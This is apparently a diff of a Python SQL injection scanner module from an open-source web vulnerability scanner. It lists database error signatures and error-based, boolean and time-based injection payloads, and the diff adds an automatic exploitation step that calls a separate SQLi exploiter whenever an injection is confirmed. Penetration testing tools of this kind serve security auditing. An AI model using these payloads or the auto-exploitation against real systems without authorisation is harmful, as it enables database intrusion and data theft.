@@ -1,25 +1,26 @@
 """
-SQL 注入检测模块（报错 / 布尔盲注 / 时延盲注）
+SQL 注入检测模块 — WebVulnScanner v6.0
 Author: 火柴 | GitHub: huocai250
 
-修复:
-- 发现漏洞后及时 return，避免对同一参数重复测试
-- 优化时延基准：先采样正常响应时间，再判断延迟
-- _req 统一调用 BaseScanner.get/post
+[优化] 集成自动利用：检测到注入后自动调用 SQLiExploiter
+[优化] 改进时延基准采样
+[优化] 统一使用 logging
 """
+import logging
+from core.logger import C as Colors
+log = logging.getLogger("webscan")
+
 import re
 import time
 from utils.http import extract_forms
 from core.scanner import BaseScanner
-from core.colors import log
+
 
 ERROR_PATTERNS = [
     r"SQL syntax.*?MySQL", r"Warning.*?mysql_", r"MySQLSyntaxErrorException",
     r"check the manual that (corresponds to|fits) your MySQL",
-    r"com\.mysql\.jdbc\.exceptions",
     r"Unclosed quotation mark", r"Microsoft OLE DB Provider for SQL Server",
     r"SQLServer JDBC Driver", r"Incorrect syntax near",
-    r"ODBC SQL Server Driver",
     r"ORA-\d{5}", r"Oracle error", r"Oracle.*Driver",
     r"quoted string not properly terminated",
     r"PostgreSQL.*ERROR", r"Warning.*pg_", r"Npgsql\.",
@@ -27,7 +28,7 @@ ERROR_PATTERNS = [
     r"SQLite/JDBCDriver", r"SQLite\.Exception",
     r"Warning.*sqlite_", r"SQLITE_ERROR",
     r"Syntax error.*in query expression",
-    r"Microsoft Access Driver", r"JET Database Engine",
+    r"Microsoft Access Driver",
 ]
 
 BOOLEAN_PAYLOADS = [
@@ -50,7 +51,6 @@ ERROR_PAYLOADS = [
     "1 ORDER BY 1--",
     "1 ORDER BY 999--",
     "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
-    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
 ]
 
 COMMON_PARAMS = ["id", "page", "q", "search", "keyword", "cat",
@@ -60,19 +60,15 @@ COMMON_PARAMS = ["id", "page", "q", "search", "keyword", "cat",
 
 class SQLiScanner(BaseScanner):
     def run(self):
-        log("INFO", "SQL 注入检测（报错/布尔/时延）...")
+        log.info("SQL 注入检测（报错/布尔/时延）...")
         r = self.get(self.target)
-        # 采样基准响应时间
         self._baseline_time = self._sample_baseline()
-        # URL 参数测试
         self._test_url_params()
-        # 表单测试
         if r:
             for i, form in enumerate(extract_forms(r.text)):
                 self._test_form(form, i)
 
     def _sample_baseline(self) -> float:
-        """采样3次正常响应时间取平均，减少误判"""
         times = []
         for _ in range(3):
             t0 = time.time()
@@ -91,10 +87,10 @@ class SQLiScanner(BaseScanner):
     def _test_form(self, form, idx):
         action = form["action"] or self.target
         if not action.startswith("http"):
-            action = self.url(action)
+            action = self.build_url(action)
         for param in form["inputs"]:
             if self._test_error_based(action, form["inputs"].copy(), param, form["method"]):
-                return  # 发现漏洞，跳过同表单其他参数
+                return
             if self._test_boolean_based(action, form["inputs"].copy(), param, form["method"]):
                 return
             self._test_time_based(action, form["inputs"].copy(), param, form["method"])
@@ -105,10 +101,14 @@ class SQLiScanner(BaseScanner):
             test[param] = str(params.get(param, "1")) + payload
             r = self._req(method, url, test)
             if r and self._has_sql_error(r.text):
-                log("VULN", f"[报错注入] 参数: {param} | Payload: {payload[:30]}")
+                log.warning(f"[VULN][报错注入] 参数: {param} | Payload: {payload[:30]}")
+                exploit_result = ""
+                if self.exploit_mode:
+                    exploit_result = self._run_exploit(url, param, method, params)
                 self.result.add("SQL 注入", "CRITICAL",
                                 f"[报错注入] 参数 '{param}' 存在 SQL 注入",
-                                f"Payload: {payload}", url=url)
+                                f"Payload: {payload}", url=url,
+                                exploit_result=exploit_result)
                 return True
         return False
 
@@ -125,16 +125,16 @@ class SQLiScanner(BaseScanner):
             fr = self._req(method, url, f)
             if not (tr and fr):
                 continue
-            true_len  = len(tr.text)
-            false_len = len(fr.text)
-            # 判断条件：true 与 orig 相近，false 与 orig 差距明显
-            if (abs(true_len - orig_len) < 30 and
-                    abs(false_len - orig_len) > 80):
-                log("VULN", f"[布尔盲注] 参数: {param} | true_len={true_len} false_len={false_len}")
+            if (abs(len(tr.text) - orig_len) < 30 and
+                    abs(len(fr.text) - orig_len) > 80):
+                log.warning(f"[VULN][布尔盲注] 参数: {param}")
+                exploit_result = ""
+                if self.exploit_mode:
+                    exploit_result = self._run_exploit(url, param, method, params)
                 self.result.add("SQL 注入", "HIGH",
                                 f"[布尔盲注] 参数 '{param}' 疑似布尔盲注",
-                                f"orig={orig_len} true={true_len} false={false_len}",
-                                url=url)
+                                f"orig={orig_len} true={len(tr.text)} false={len(fr.text)}",
+                                url=url, exploit_result=exploit_result)
                 return True
         return False
 
@@ -147,12 +147,37 @@ class SQLiScanner(BaseScanner):
             self._req(method, url, test)
             elapsed = time.time() - t0
             if elapsed >= threshold:
-                log("VULN", f"[时延盲注] 参数: {param} 响应 {elapsed:.1f}s (基准 {self._baseline_time:.1f}s)")
+                log.warning(f"[VULN][时延盲注] 参数: {param} 响应 {elapsed:.1f}s")
+                exploit_result = ""
+                if self.exploit_mode:
+                    exploit_result = self._run_exploit(url, param, method, params)
                 self.result.add("SQL 注入", "HIGH",
-                                f"[时延盲注] 参数 '{param}' 疑似时延盲注 (响应 {elapsed:.1f}s)",
-                                f"Payload: {payload}", url=url)
+                                f"[时延盲注] 参数 '{param}' (响应 {elapsed:.1f}s)",
+                                f"Payload: {payload}", url=url,
+                                exploit_result=exploit_result)
                 return True
         return False
+
+    def _run_exploit(self, url, param, method, base_params) -> str:
+        """[新增] 调用利用模块"""
+        try:
+            from modules.exploit.sqli_exploit import SQLiExploiter
+            exploiter = SQLiExploiter(self)
+            info = exploiter.exploit(url, param, method, base_params)
+            # 将详细利用结果存入 extra
+            lines = []
+            for k, v in info.items():
+                if isinstance(v, (str, int, float)):
+                    lines.append(f"{k}: {v}")
+                elif isinstance(v, list):
+                    lines.append(f"{k}: {', '.join(str(x) for x in v[:10])}")
+                elif isinstance(v, dict):
+                    for kk, vv in list(v.items())[:5]:
+                        lines.append(f"  {kk}: {str(vv)[:100]}")
+            return "\n".join(lines)
+        except Exception as e:
+            log.debug(f"SQLi 利用异常: {e}")
+            return f"利用失败: {e}"
 
     def _req(self, method, url, params):
         if method == "POST":
